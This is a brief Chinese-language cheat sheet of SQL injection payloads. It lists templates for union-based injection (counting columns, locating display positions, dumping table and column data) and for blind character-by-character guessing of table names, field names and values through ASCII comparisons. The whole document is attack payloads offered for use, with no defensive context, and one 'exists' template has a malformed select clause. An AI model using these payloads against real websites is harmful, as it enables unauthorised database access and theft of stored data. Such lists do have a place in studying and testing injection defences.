### 联合查询注入

#### 查询字段数

```mysql
order by 1
```

#### 爆表名

```mysql
and exists (select from 表名)
```

#### 判断其显示位

```mysql
union select 1,2,3 from 表名
```

#### 爆列名

```mysql
and exists (select 字段名 from 表名)
```

#### 爆数据

```mysql
union select 1,字段名,3 from 表名
```

### 逐行猜解

#### 猜解表名

```mysql
and exists (select from 表名)
```

#### 猜解字段名

```mysql
and exists (select 字段名 from 表名)
```

#### 猜数据内容长度

```mysql
and (select top 1 len(字段名) from 表名) = 1
```

#### 猜数据内容

```mysql
and (select top 1 asc(mid(字段名,1,1)) from 表名) = ascii码
```

